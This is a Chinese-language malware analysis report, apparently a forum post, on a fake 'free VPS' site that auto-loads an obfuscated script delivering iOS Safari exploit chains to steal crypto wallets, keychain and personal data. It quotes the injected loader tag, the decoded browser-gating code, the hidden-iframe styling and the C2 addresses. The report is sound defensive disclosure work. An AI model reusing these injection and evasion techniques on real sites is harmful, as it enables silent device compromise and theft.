### 1. 概述

2026年9月1日，一个名为 **"极点云 PolarNode"** 的站点 `event.polarnode.vip` 上线（域名8月31日注册），以"完成预约，前 5,000 名用户均可获得免费 VPS，最高赠送 3 年使用权"为噱头，在 VPS / 运维 / 区块链相关论坛与社群中通过"邮箱 + 邀请码裂变"方式扩散。该站点**无真实 VPS 销售能力、无公司主体、无联系方式、无售后支持**，其唯一实质功能是在页面加载后**自动注入一段高复杂度混淆的恶意脚本**，对访问者的 iOS Safari 浏览器发起完整的远程攻击。

经对落地页、投递脚本 `lk.js` 及其级联加载的 `dist/` 利用链（vendor.js、runtime.js、framework.js、group.html、common.js、app.js 等）逐层反混淆与静态取证，确认这是一个**覆盖 iOS 15.2 至 18.6.2 的浏览器端 RCE 利用投递平台**，按系统版本分由两套框架投递——**iOS 18.4 / 18.4.1 / 18.5 / 18.6 / 18.6.1 / 18.6.2（build 22E240/22E252/22F76/22G86/22G90/22G100）经 DarkSword 框架（含两条利用路径）**，**iOS 15.2–17.1（含 iOS 16.0–16.6，排除 16.7+）经 Coruna 框架**——最终统一向 `SpringBoard` 等系统进程注入窃取模块，定向盗取**加密货币钱包（imToken / TronLink / 通用钱包）、钥匙串（Keychain）、短信、通讯录、相册、备忘录、iCloud、位置与健康数据**等并回传 C2。其偏移表覆盖广度、内核原语完整度，以及载荷层保留的 DarkSword 原生模块（`keychain_dump.js` / `wifi_password_securityd.js` / `icloud_dumper.js`）与 `CHAIN` / `MAIN` 日志标签，表明其为商用级 iOS 间谍软件套件的**犯罪化再分发版本**。

### 2. 攻击分析

#### 2.1 诱饵站点与传播分析

落地页 `event.polarnode.vip` 是一个标准的 Next.js（Turbopack）单页应用，自称"极点云 PolarNode"。页面话术高度模仿正规云厂商，包含机型规格、带宽、节点区域（硅谷 / 首尔 / 香港）、"内测预约"倒计时等完整营销框架，并设置"前 100 / 500 / 1000 / 5000 名"阶梯式赠送权益。

其裂变机制如下：

1.   **提交预约**：仅需填写邮箱（且标注"每个邮箱、每个 IP 仅可预约一次"）。
2.   **分享邀请**：预约成功后生成专属链接，每邀请一人增加 1 个月使用权，最多 +12 个月。
3.   **等待内测**：宣称 2026-09-09 10:00（香港时间）开启内测，通过预约邮箱发送领取通知。
4.   **领取 VPS**：按预约顺序领取。

#### 2.2 投递与加载机制

对落地页 HTML 的取证显示，恶意脚本并非依赖用户交互，而是在页面进入可交互状态后**由框架自动注入**：

```
<link rel="preload" href="https://lk.wyincc.com/lk.js" as="script"/>
<!-- Next.js next/script strategy:"afterInteractive" -->
["$Le",null,{"src":"https://lk.wyincc.com/lk.js","strategy":"afterInteractive"}]
```

`afterInteractive` 策略意味着脚本在页面首屏渲染、用户可交互后加载，**访问者无需任何点击即完成恶意代码下载与执行**。这正是移动端"零点击 / 一点击"攻击投递的典型特征——攻击面完全暴露在浏览器渲染阶段。

#### 2.3 混淆与解码器分析（`lk.js`）

`lk.js` 采用 **[obfuscator.io](https://www.nodeseek.com/jump?to=http%3A%2F%2Fobfuscator.io)** 重度混淆：字符串数组 + RC4/Base64 + 十六进制算术变换。通过提取其内嵌解码器（`a0_0x18cf` 解密函数与 `a0_0x23be` 字符串数组）并在本地 Node 环境中批量还原，得到其真实逻辑：

*   运行时先做 **User-Agent / 平台指纹识别**，仅对 **iOS Safari** 分支继续利用；非目标平台（桌面、Android）仅完成诱饵表单交互，**iOS 上的第三方浏览器与 App 内 WebView 亦被主动排除**（详见下文"浏览器触发条件"）。
*   构造一个**隐藏 iframe**，从同域加载 `sandbox.html` / `group.html`，将实际利用代码隔离在沙箱文档中执行，降低被页面主上下文检测到的概率；iframe 样式为 `width:0;height:0;border:none;position:fixed;left:-9999px;top:-9999px;opacity:0;pointer-events:none;visibility:hidden`。
*   通过 `postMessage` 与 iframe 内利用代码通信，传递阶段指令与配置。
*   **重复感染防护与利用锁定**：利用前先检查 `localStorage` 中的 `_tc_sid` 标记，若已存在则直接返回（同一设备不重复投放）；收到 iframe 回传的 `pe_injected`（注入成功）事件后写入 `_tc_sid`，收到 `chain_locked`（利用链锁定/失败）事件后写入 `_tc_time` 并种下 `_tc_r=1` cookie，用于后续访问的短路判定。
*   内置 C2 端点指示：`13.248.210.49:36887` 与 `166.117.225.238`。

**浏览器触发条件：WebKit 内核共享与本样本的选择性触发**

**① iOS 各浏览器共用同一渲染引擎 [@cloudfIare](https://www.nodeseek.com/member?t=cloudfIare) 提供相关信息**

*   Apple 的平台规则要求，iOS 上所有提供网页浏览功能的第三方应用必须基于系统 **WebKit.framework** 与 **JavaScriptCore** 构建（WKWebView / JSC），不得自带独立渲染引擎。因此 Chrome（`CriOS`）、Firefox（`FxiOS`）、Edge（`EdgiOS`）、Opera（`OPiOS`）在 iOS 上均运行于 WebKit 内核，而非其在桌面平台使用的 Blink / Gecko。
*   本利用链涉及的浏览器侧漏洞——**CVE-2025-43529**（JSC DFG JIT 写屏障缺失）、**CVE-2025-31277**（JSC JIT 正则类型混淆）、**CVE-2025-14174**（ANGLE/WebGL 越界写）——均位于**共享的 WebKit 框架与 JavaScriptCore 层**，不属于 Safari 应用自身代码。
*   由此，设备是否具备可利用面**取决于 iOS 系统版本（即 WebKit 与内核版本），与使用哪款浏览器无关**。在受影响系统版本（iOS 15.2–18.6.2，含 Coruna 路径覆盖的 iOS 16 等旧版本）上，Safari、第三方浏览器与 App 内 WebView（微信、QQ、Telegram、支付宝等）面对的是**同一份可利用面**。同时 WebKit 只能随 iOS 系统更新修补、无法由浏览器 App 独立升级修复，系统升级是消除该可利用面的唯一路径（见 §5.1）。

**② 样本对浏览器环境的判定与分流**

解码后的 `lk.js` 主逻辑先完成 User-Agent 指纹判定，再据此分流到两条独立的利用链加载分支——**iOS 18.4–18.6.2 → 加载 `dist/sandbox.html`（DarkSword 链）；iOS 15.2–17.1（排除 16.7+）→ 加载 `group.html`（Coruna 链）**。全文仅有这两处 iframe `src` 赋值（URL 路径亦只有 `sandbox.html` 与 `group.html` 两个），**不存在第三个投递分支**；版本判定之外（iOS 13.0–15.1、16.7+、17.2–18.3、18.7+ 及 iPad）一律直接 `return`。上述分流发生在 Safari 判定**之后**：当且仅当 UA 通过 Safari 校验时，才会继续加载任一分支；否则直接结束执行。因此第三方浏览器与 App 内 WebView 既不会加载 DarkSword 链，也不会加载 Coruna 链。其判定逻辑如下：

```
var isSafari = /Safari\/\d/i.test(ua) && /Version\//i.test(ua)
  && !/CriOS|FxiOS|OPiOS|EdgiOS/i.test(ua)   // 排除 Chrome / Firefox / Opera / Edge
  && !/Line\/|KAKAOTALK|Twitter|Instagram|FBAN|FBAV|WhatsApp|Snapchat|Pinterest|LinkedIn|Weibo|MicroMessenger|QQ\/|baiduboxapp|DingTalk|Alipay|UCBrowser|HuaweiBrowser|MiuiBrowser|VivoBrowser|OppoBrowser|SamsungBrowser/i.test(ua)
  && !/CFNetwork/i.test(ua)
  && /Mobile\/\w+ Safari/i.test(ua);
if (!isSafari) { /* 注入"请在 Safari 中打开"引导页，不加载利用模块 */ }
```

非 Safari 环境下，样本不加载任何利用模块，转而注入一段全屏引导层覆盖原页面（CSS：`body > *:not(#_sf_guide){display:none !important}; body{margin:0;background:#fff !important}`），配仿 Safari 图标的蓝色渐变 SVG（`#5AC8FA`→`#007AFF`），引导文案为：

> **Please open in Safari**
> 
>  This page does not support the current browser. Long press the link below to copy, then open in Safari.
> 
>  〔 Long press to copy link 〕

> 关于引导页能否在预约页面上实际呈现：`lk.js` 由 `event.polarnode.vip` 落地页经 Next.js `afterInteractive` 以常规 `<script>` 形式加载，运行在落地页**顶层文档（top-level document）**上下文中，而非沙箱 iframe 内部；"隐藏加载"仅指脚本随页面自动加载、无需用户点击，并不抑制其 DOM 写入效果。因此非 Safari 浏览器打开该落地页时，引导层会被真实注入并覆盖原页面（原页面内容经 CSS 隐藏、引导层 `z-index:999999` 置顶）。需说明的是，该引导页**不自动跳转**，仅展示当前 URL 并提示"长按复制链接后在 Safari 中打开"，将访问以人工方式迁移至 Safari 后再加载利用链——这也意味着，若 `lk.js` 被置于 1px×1px 透明 iframe 的水坑攻击场景，引导层会渲染在不可见的 iframe 内、受害者无从察觉，此时该 Safari 门槛仅使利用静默失效。无论哪种场景，第三方浏览器本身均不会触发任何利用代码。

**③ 该分流设计的工程含义**

*   样本在非 Safari 环境中不加载利用模块，其引导页会促使用户复制链接并改用 Safari 打开，使访问最终落入样本可控性最高的执行环境。
*   偏移表与 JIT 内存布局对 WebKit 具体版本高度敏感，第三方浏览器的 WKWebView 在 JIT 配置与进程模型上存在差异，将执行环境收敛至 Safari 有助于提高利用成功率。
*   "长按复制链接"的交互使目标 URL 以纯文本形式传递，可绕过聊天工具与邮件网关的链接安全扫描。
*   检测层面，受害者所使用的浏览器类型不构成排除条件；**"请在 Safari 中打开 / Please open in Safari"一类强制切换浏览器的引导话术**应作为高风险社工特征，纳入 §5.3 的网关拦截与终端检测规则。

#### 2.5 后渗透与数据窃取分析（`app.js`）

`app.js`（540 KB，webpack 打包，含 `./src/**` 模块结构）是注入系统进程后的最终窃取组件，对应 DarkSword 的 `pe_main.js`。其行为完全符合 DarkSword 的"打带跑（hit-and-run）"模式：窃取完成后清理痕迹并退出，**无持久化机制**。

#### 2.6 C2 通信分析

利用链与窃取模块的外联指标如下（已在多份样本中交叉命中）：

*   **13.248.210.49:36887** —— 主 C2 端点（`lk.js` 硬编码，含端口 36887）。
*   **166.117.225.238** —— 备用 / 关联端点（`lk.js` 硬编码）。
*   两个 IP 经查询均落在 **AWS Global Accelerator** 背后，具备弹性隐匿与快速更换能力。
*   通信含心跳（heartbeat）、阶段上报与加密数据回传；SDK 默认端口为 80，规避非常规端口审查。

**回传地址由服务端动态下发**

`app.js` 并未硬编码最终 exfil 地址，而是通过 base64 解码的配置对象 `_pcfg`（JSON）读取回传参数：`server_url` / `server_host` / `uid` / `device_source`，`_SDK_PORT` 默认 80，亦支持从 URL 解析 host:port。这意味着**不同受害者可能收到不同的 C2 地址**，显著提升封锁难度——仅封堵上述两个硬编码 IP 并不足以彻底切断回传。

**数据加密**

#### 2.7 漏洞映射：DarkSword 全链利用与受影响版本

经与 Google Threat Intelligence（GTIG）、iVerify、Lookout 于 2026-03 联合披露的 **DarkSword** iOS 全链利用套件比对，本样本在**模块命名（`sbx1_main.js` 直接同名、全链文件名逐一对映）、阶段架构（RCE → PAC 绕过 → SBX0 GPU 逃逸 → SBX1 内核读写 → LPE）、原生载荷组件（`keychain_dump.js` / `wifi_password_securityd.js` / `icloud_dumper.js`）、日志标签（`CHAIN` / `MAIN`），以及钱包/钥匙串定向窃取**上高度吻合，可判定为 **DarkSword 的 UNC6353 原生变体（18.4–18.6.2）被犯罪团伙二次加工后用于虚拟货币盗取**。该套件链式利用 6 个漏洞（**披露时含 3 个 0day**，现均已公开并修复），全部以纯 JavaScript 实现，全程无需注入任何 Mach-O 二进制，可绕过 Page Protection Layer（PPL）与 Secure Page Table Monitor（SPTM）。
